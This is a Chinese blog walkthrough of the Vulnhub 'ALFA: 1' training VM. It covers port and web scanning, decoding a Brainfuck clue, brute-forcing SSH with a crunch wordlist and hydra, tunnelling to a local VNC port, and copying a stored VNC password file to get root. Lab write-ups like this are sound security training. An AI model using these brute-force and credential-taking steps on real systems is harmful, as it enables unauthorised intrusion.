---
title: 'Vulnhub ALFA: 1'
typora-root-url: Vulnhub-ALFA-1
abbrlink: 29204
date: 2021-03-21 18:19:02
tags: 
	- Vulnhub
	- "ALFA: 1"
categories: 
  - 渗透靶机训练
description: "Vulnhub ALFA: 1"
excerpt: "Vulnhub ALFA: 1"
---

# ALFA: 1

## USER FLAG

### 端口探测

使用nmap扫一下开放的端口：

```bash
nmap -sC -sV -A -p- -T5 192.168.145.132
```

得到以下关键信息：

![image-20210321182509791](image-20210321182509791.png)

### FTP

由于服务器启用了ftp服务，连接上去看看。

得到以下内容：

![image-20210321182635487](image-20210321182635487.png)

这里可以猜测用户名就是thomas，确认一下，使用**enum4linux**来确认一下：

```bash
enum4linux -a -r 192.168.145.132
```

获取到关键信息：

![image-20210321183644637](image-20210321183644637.png)

可以确信thomas即为用户名。

### Web

服务器亦有80端口的HTTP服务，使用浏览器访问：

![image-20210321182729719](image-20210321182729719.png)

查看源代码，发现所有超链接均为锚点。

至此从HTML代码中寻找思路显然不可取了，扫描一下WebPath。

使用**nikto**扫描：

```bash
nikto -h 192.168.145.132
```

![image-20210321183854605](image-20210321183854605.png)

未获取到关键信息，再使用**dirb**扫描：

```bash
dirb http://192.168.145.132/
```

发现关键信息：

![image-20210321184005002](image-20210321184005002.png)

Web服务器下有robots.txt，访问得到：

![image-20210321184036371](image-20210321184036371.png)

滑动至最低端，发现有一字符串：

```brainfuck
++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>+++++++++++++++++.>>---.+++++++++++.------.-----.<<--.>>++++++++++++++++++.++.-----..-.+++.++.
```

> 解码地址：[https://www.dcode.fr/brainfuck-language](https://www.dcode.fr/brainfuck-language)

经搜索，此为Brainfuck编码，将其解码得到：

```http
/alfa-support
```

访问该路径。

得到以下信息：

![image-20210321184337802](image-20210321184337802.png)

发现关键信息：**I only remember that it is the name of my pet followed by numerical digits**。

至此，Web上能获取的信息已经全部获取完了。

### SSH

之前nmap扫描的结果显示服务器再65111端口上开放了SSH服务。

考虑到使用enum4linux确定Thomas是一个服务器用户，并且密码是宠物的名字+三个数字，联系到FTP服务器上的图片内容为一只狗，名字为milo，可以猜测Pet's name 为milo，使用**crunch**生成一个字典。

```bash
crunch 7 7 1234567890 -t milo%%% -o wordlist
```

字典生成完成后使用**hydra**爆破ssh。

```bash
hydra -l thomas -P wordlists ssh://192.168.145.132:65111 -t 64
```

爆破成功，结果如图：

![image-20210321185006788](image-20210321185006788.png)

使用SSH登录服务器：

```bash
ssh thomas@192.168.145.132 -p 65111
```

成功登录服务器，发现USER的FLAG。

![image-20210321185202074](image-20210321185202074.png)

至此，还有ROOT FLAG未拿到。

## ROOT FLAG

在上面的基础上，发现一个文件所属用户为root：

![image-20210321185535601](image-20210321185535601.png)

查看文件内容发现为乱码：

![image-20210321185603702](image-20210321185603702.png)

根据其名字联想应该是加密后的密码。

未知其作用，暂且搁置，查看一下系统监听的TCP端口：

```bash
ss -tlpn
```

![image-20210321190104133](image-20210321190104133.png)

发现系统监听了本地5901端口。

不知道这是什么服务，nmap之前也没有该端口的信息，考虑可能未对外开放，利用ssh正向代理建立一个代理隧道：

```
ssh -L 0.0.0.0:5901:127.0.0.1:5901 thomas@192.168.145.132 -p 65111
```

检查隧道状态：

![image-20210321190643617](image-20210321190643617.png)

状态正常，这个时候再使用nmap扫描一次，由于代理隧道建立，我们只需要扫描本机的5901端口即可等同于扫描服务器的5901端口：

```bash
nmap -sC -sV -p5901 localhost
```

![image-20210321190839159](image-20210321190839159.png)

发现这是一个VNC端口，想到之前看到的**\.remote_secret**文件，猜测该文件便是加密后的密码。

从服务器中下载该文件到本地：

```bash
scp -P 65111 thomas@192.168.145.132:/home/thomas/.remote_secret .remote_secret
```

![image-20210321191006651](image-20210321191006651.png)

使用该文件作为VNC密码登录服务器：

```bash
vncviewer -passwd .remote_secret 127.0.0.1:5901
```

成功拿到ROOT FLAG：

![image-20210321191231180](image-20210321191231180.png)

